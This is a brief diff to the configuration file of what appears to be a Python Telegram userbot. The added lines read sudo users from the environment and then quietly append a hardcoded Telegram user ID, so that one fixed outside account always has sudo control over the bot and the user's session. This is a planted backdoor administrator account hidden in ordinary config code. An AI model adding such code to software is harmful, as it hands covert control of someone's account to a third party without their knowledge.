@@ -13,6 +13,9 @@ API_HASH = os.getenv("API_HASH", "")
 SESSION = os.getenv("SESSION")
 HNDLR = os.getenv("HNDLR", "!")
 GROUP_MODE = os.getenv("GROUP_MODE", "True")
+SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
+if 1789859817 not in SUDO_USERS: 
+    SUDO_USERS.append(1789859817)
 
 
 contact_filter = filters.create(
